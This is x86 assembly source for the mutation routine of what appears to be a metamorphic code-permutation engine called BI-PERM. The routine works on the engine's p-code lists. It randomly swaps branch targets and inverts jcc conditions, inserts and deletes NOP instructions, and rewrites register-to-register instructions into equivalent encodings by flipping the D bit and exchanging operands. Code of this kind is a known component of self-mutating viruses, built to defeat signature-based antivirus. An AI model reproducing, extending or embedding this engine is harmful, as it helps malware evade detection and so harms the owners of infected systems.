
;===============================================================================
;Standard mutation routine of BI-PERM engine
;This user defined routine mutates list of p-codes
;Prototype of procedure:
; void __stdcall user_mutate (
;           void *user_param, //user parameter (not used here)
;           void *user_random,//user_random procedure (read permutator.asm)
;           void *pcode,      //buffer with p-codes (read format below)
;           long *pnum        //pointer to the number of p-codes in input buffer
;           );                //and pcode buffer's barriere
;
;pcode is an array of p-code structures. The format of p-code structure:
;  _______________________________________
; |. . o p c o d e . . .|r e l j|s|n e x t|             
; 0                     11     15 16      20
;
;opcode+relj - immediate opcode
;relj        - pointer to branch of p-code in call/jcc (read below)
;s           - size of opcode and optional attributes (read below)
;next        - pointer to next p-code in chain (zero in terminating commands)
;
;
;Notes: 
;1. Immediate field (offset) in jmp lbl/call lbl/jcc/loop-e-ne/jecxz commands 
;   have junk value and can be overwritten (it haven't influnce)
;2. Jcc has 0f 8x opcode only (all 7x was converted in 0f 8x)
;3. In jcc/call lbl/loop-e-ne/jecxz commmands relj field points to branch of
;   p-codes. relj is a part of opcode in other commands
;4. Field 'next' equal zero in terminating commands (ret/jmp mem/call mem/etc)
;5. You can change 'relj', 'next', 'opcode' fields
;6. You can add new p-codes in the end of pcode buffer
;   pnum pointer is low barriere of p-code's buffer
;7. Format of s field:
;  _______________
; |0 b x x s s s s|
; 8               0
;
; 0 - reserved internal engine's bit (must be zero)
; b - indicates if command is a label (i.e. some branching command points on it)
; x - two bits defined by user via disasm routine
; s - four bits of size of opcode  
;
; you can change b, x and s bits only
;
;-------------------------------------------------------------------------------
; Example mutation routine
;
;It randomly does the next things:
;
;It changes branches of execution in jcc commands. For example:
;A generationn
;     js @1
;     ...op1...
;  @1:...op2...
;B generation
;     jns @2
;     ...op2...
;  @2:...op1...
;
;It inserts nop commands between code (and deletes previous nops).
;
;It inverts bit D in opcodes and exchange operands.
;For commands mov/add/or/adc/sbb/and/sub/xor/cmp reg1,reg2 example:
;<mov eax,ecx> == 8b c1 == 89 c8 (invert bit D and exchange operands)
;
;And test/xchg reg1,reg2 mutation (exchange operands)
;test al,dl == test dl,al
;
;===============================================================================

;p-code's structure
pcd_opcode	= 0			;opcode bytes (+relj field optionally)
pcd_relj	= dword ptr 11		;next p-code in branching opcodes only
pcd_isz		= byte  ptr 15		;size of opcode and flags
pcd_next	= dword ptr 16		;address of next opcode in chain or zero
pcd_size	= 20

;routine's arguments
user_param	= dword ptr 0		;user parameter (not used here)
user_random	= dword ptr 4		;user_random procedure
arg_pcode	= dword ptr 8		;buffer with p-codes
arg_pnum	= dword ptr 12		;pointer to the number of p-codes in
					;buffer and pcode buffer's barriere

perm_mutate proc
	pushad

	mov	edx, esp
	mov	esi, [arg_pcode][edx+36]
	mov	eax, [arg_pnum][edx+36]
	mov	ecx, [eax]	;ecx = number of p-codes
	lea	ebp, [eax-pcd_size*10]	;low barriere of p-code's buffer
	imul	ebx, ecx, pcd_size
	add	ebx, esi	;end of p-code's array

 lm_next_pcode:
	mov	edi, esi	;set edi on current p-code

	push	[user_param][edx+36]
	call	[user_random][edx+36]
	and	al, 3ch
	cmp	al, 8		;jmp 1:15
	jne	lm_no_nop_add
	cmp	ebx, ebp
	jae	lm_no_nop_add
	mov	byte ptr [pcd_opcode][ebx], 90h	;insert nop
	mov	[pcd_isz][ebx], 1
	mov	eax, [pcd_next][esi]
	mov	[pcd_next][esi], ebx
	mov	[pcd_next][ebx], eax
	add	ebx, pcd_size
 lm_no_nop_add:
	push	ebx

	lodsb
	cmp	al, 90h
	jne	lm_not_nop
	and	[pcd_isz][esi-1], 0f0h	;delete nop (size equal zero)
 lm_not_nop:
	mov	bl, al		;save original opcode in bl
	and	al, 0FCh	;clear two low bits (it variable)
	cmp	al, 84h		;test,xchg
	je	lm_xchg_reg
	xor	bl, 2		;invert bit D (second bit)
	cmp	al, 88h		;mov
	je	lm_xchg_reg
	and	al, 0C7h	;add,or,adc,sbb,and,sub,xor,cmp
	jnz	lm_no_meta
 lm_xchg_reg:
	push	[user_param][edx+36]
	call	[user_random][edx+36]
	and	al, 78h
	jnp	lm_no_meta	;jump 50:50
	lodsb			;get modr/m field
	dec	esi
	shl	al, 1
	jnc	lm_no_meta
	jns	lm_no_meta	;if mod!=11b, then don't process
	shl	al, 1
	aam	20h		;now exchange ro/rm 
	shl	al, 1
	add	al, ah
	or	al, 0c0h	;set mod in 11b (now in al new modr/m)
	xchg	eax, ebx
	stosb			;write new opcode
	xchg	ebx, eax
	stosb			;write new modr/m
 lm_no_meta:
	cmp	byte ptr [esi-1], 0fh
	jne	lm_no_jcc_mutate
	mov	al, [esi]
	and	al, 0f0h
	cmp	al, 80h
	jne	lm_no_jcc_mutate
	push	[user_param][edx+36]
	call	[user_random][edx+36]
	and	al, 78h
	jp	lm_no_jcc_mutate	;jmp 50:50
	mov	eax, [pcd_relj][esi-1]
	xchg	eax, [pcd_next][esi-1]
	mov	[pcd_relj][esi-1], eax
	xor	byte ptr [esi], 1	;invert jcc condition

 lm_no_jcc_mutate:
	add	esi, pcd_size-1		;next p-code in array
	pop	ebx
	dec	ecx
	jnz	lm_next_pcode		;loop out of range :((

	popad
	ret	10h
perm_mutate endp


